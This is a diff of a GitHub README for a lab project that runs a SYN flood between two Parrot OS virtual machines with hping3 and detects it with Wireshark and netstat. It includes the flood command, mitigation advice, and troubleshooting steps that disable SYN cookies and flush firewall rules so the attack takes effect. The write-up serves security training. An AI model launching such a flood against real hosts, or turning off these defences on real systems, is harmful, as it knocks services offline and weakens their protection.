@@ -16,148 +16,190 @@ This project demonstrates a **SYN Flood Denial-of-Service (DoS) attack** perform
 
 - **Parrot OS** (Attacker + Victim)
 - **VirtualBox Host-Only Networking**
-- **hping3** for generating malicious traffic
-- **Wireshark** for network packet capture and analysis
+- **hping3** for generating SYN flood traffic
+- **Wireshark** for packet capture and analysis
 
-> ⚠️ **Ethical Notice**  
-> This experiment was conducted in an isolated lab environment strictly for learning and research.  
-> Do **NOT** attempt these techniques on systems you do not own or do not have explicit authorization to test.
+> ⚠️ Ethical Notice:  
+> This experiment was performed strictly in an isolated lab setup for educational and research purposes.  
+> Do **NOT** attempt these techniques on systems or networks without permission.
 
 ---
 
 ## 🧪 Lab Configuration
 
-| Component                  | Details       |
-|---------------------------|--------------|
-| Hypervisor                | VirtualBox   |
-| Operating System (Attacker) | Parrot OS  |
-| Operating System (Victim) | Parrot OS    |
-| Network Mode              | Host-Only    |
-| Attacker Address          | `[REDACTED]` |
-| Victim Address            | `[REDACTED]` |
+| Component | Details |
+|----------|---------|
+| Hypervisor | VirtualBox |
+| Attacker OS | Parrot OS |
+| Victim OS | Parrot OS |
+| Network Mode | Host-Only |
+| Attacker IP | `[REDACTED]` |
+| Victim IP | `[REDACTED]` |
 
 ---
 
 ## 🛠 Tools Used
 
-| Tool        | Purpose                               |
-|------------|----------------------------------------|
-| `hping3`   | Generates SYN flood traffic            |
-| Wireshark  | Packet inspection and analysis         |
-| `netstat`  | Live TCP connection state monitoring   |
-| Metasploit | Optional framework for further testing |
+| Tool | Purpose |
+|------|---------|
+| `hping3` | SYN flood generator |
+| **Wireshark** | Packet capture and analysis |
+| `netstat` | Verify TCP state (`SYN_RECV`) |
+| Metasploit (optional) | Additional attacker framework |
 
 ---
 
 ## ⚙️ Execution Steps
 
-### 1️⃣ Install Required Tools
+### 🧩 Step 1 — Install Required Tools
 
-**On Attacker:**
-
-~~~bash
+**Attacker:**
+```bash
 sudo apt update
 sudo apt install hping3 metasploit-framework -y
-~~~
+```
 
-**On Victim:**
-
-~~~bash
+**Victim:**
+```bash
 sudo apt update
 sudo apt install wireshark -y
-~~~
+```
 
 ---
 
-### 2️⃣ Start Packet Capture (Victim)
+### 🧩 Step 2 — Start Packet Capture
 
-On the victim machine:
+On the victim machine, open **Wireshark** and apply:
 
-1. Open **Wireshark**.
-2. Select the appropriate network interface (Host-Only adapter).
-3. Start capture and apply the display filter:
-
-~~~text
+```
 tcp.flags.syn == 1 && tcp.flags.ack == 0
-~~~
+```
 
-This filter focuses on SYN packets that **do not** have the ACK flag set, which is typical of SYN flood traffic.
+This filter shows SYN packets lacking an ACK response — typical in SYN flood attacks.
 
 ---
 
-### 3️⃣ Launch the SYN Flood (Attacker)
+### 🧩 Step 3 — Launch SYN Flood (Attacker)
 
-On the attacker machine, run:
-
-~~~bash
+```bash
 sudo hping3 -S --flood -p 80 <VICTIM-IP>
-~~~
+```
 
-**Parameter breakdown:**
-
-| Flag        | Meaning                          |
-|------------|-----------------------------------|
-| `-S`       | Send TCP packets with SYN flag    |
-| `--flood`  | Send packets as fast as possible  |
-| `-p 80`    | Target TCP port (HTTP)            |
-| `<VICTIM-IP>` | IP address of the victim      |
+| Option | Meaning |
+|--------|---------|
+| `-S` | Sends TCP SYN packets |
+| `--flood` | Sends packets as fast as possible |
+| `-p 80` | Target port (HTTP) |
+| `<VICTIM-IP>` | Redacted |
 
 ---
 
-### 4️⃣ Verify Impact (Victim)
+### 🧩 Step 4 — Verify Impact (Victim)
 
-On the victim, check TCP connection states:
-
-~~~bash
+```bash
 netstat -ant | grep SYN_RECV
-~~~
+```
 
-You should observe:
+Expected symptoms:
 
-- Multiple connections stuck in `SYN_RECV` state  
-- Few or no fully established connections  
-- Signs of resource exhaustion / service degradation  
-
----
-
-## 📊 Results & Indicators
-
-| Indicator                                 | Observed | Notes                           |
-|-------------------------------------------|----------|---------------------------------|
-| High volume of SYN packets                | ✔        | Visible in Wireshark           |
-| Lack of ACK responses                     | ✔        | Incomplete TCP handshakes      |
-| Many connections in `SYN_RECV` state      | ✔        | Half-open connections          |
-| Potential slow-down of victim services    | ✔ (lab)  | Simulated DoS behavior         |
+- Multiple half-open TCP connections  
+- Lack of proper handshake (no SYN-ACK exchange)  
+- Resource consumption / delay  
 
 ---
 
-## 🧯 Mitigation Recommendations
+## 📊 Evidence & Interpretation
 
-| Defense Technique                         | Purpose                                  |
-|-------------------------------------------|------------------------------------------|
-| Enable SYN cookies                        | Protect TCP backlog from exhaustion      |
-| Firewall rate limiting (iptables/ufw)     | Throttle excessive SYN requests          |
-| IDS/IPS (Snort, Suricata)                 | Detect anomalous network traffic         |
-| Fail2Ban / firewall automation            | Block abusive or repeated offenders      |
+| Indicator | Result | Meaning |
+|----------|--------|--------|
+| High SYN packet rate | ✔ | DoS behavior confirmed |
+| No ACK responses | ✔ | Incomplete handshake |
+| Backlog via `SYN_RECV` | ✔ (after troubleshooting) | System overwhelmed |
 
-Example of enabling SYN cookies:
+---
 
-~~~bash
+## 🛡 Mitigation & Defense
+
+| Technique | Purpose |
+|-----------|---------|
+| Enable SYN cookies | Protect TCP queue overflow |
+| Apply rate-limiting firewall rules | Reduce impact |
+| Use IDS/IPS (Suricata/Snort) | Detect anomalies |
+| Fail2Ban | Auto-block abusive clients |
+
+Enable SYN cookies:
+
+```bash
 sudo sysctl -w net.ipv4.tcp_syncookies=1
-~~~
+```
 
+
+## 🛠 Troubleshooting
+
+If Wireshark shows the SYN flood but `netstat` does **not** show `SYN_RECV`, follow these steps:
+
+---
+
+### ✔ 1 — Start a Web Server (Victim)
+
+```bash
+sudo python3 -m http.server 80
+```
+
+---
+
+### ✔ 2 — Disable SYN Cookies (Lab Only)
+
+Check status:
+
+```bash
+sysctl net.ipv4.tcp_syncookies
+```
+
+Disable temporarily:
+
+```bash
+sudo sysctl -w net.ipv4.tcp_syncookies=0
+```
+
+> ⚠️ Only for lab testing — do not disable in production.
+
+---
+
+### ✔ 3 — Allow Traffic (Remove Firewall Rules)
+
+```bash
+sudo iptables -F
+```
+
+---
+
+### ✔ 4 — Run the Attack Again
+
+```bash
+sudo hping3 -S --flood -p 80 <VICTIM-IP>
+```
+
+---
+
+### ✔ 5 — Check TCP State Again
+
+```bash
+netstat -ant | grep SYN_RECV
+```
+
+Expected output example:
+
+```
+tcp 0 0 [VICTIM-IP]:80 [ATTACKER-IP]:49152 SYN_RECV
+tcp 0 0 [VICTIM-IP]:80 [ATTACKER-IP]:49153 SYN_RECV
+```
+
+---
 
 ## 🎯 Conclusion
 
-This project successfully demonstrates how a SYN Flood attack can be executed and identified in a controlled lab environment. By analyzing packet captures and TCP connection states, it becomes clear how incomplete TCP handshakes can be used to overwhelm a target system.
+This project successfully demonstrates how a SYN Flood attack affects a target system and how packet analysis tools like Wireshark can be used to identify characteristic traffic patterns. The experiment supports defensive understanding, network security training, and forensic investigation techniques.
 
-The exercise reinforces key concepts in:
+---
 
-- Network security  
-- Traffic forensics  
-- Incident detection & response  
-
-
-### 📬 Connect
-
-If you find this useful, feel free to **star ⭐ the repo**, **fork** it, or open an **issue** with suggestions!
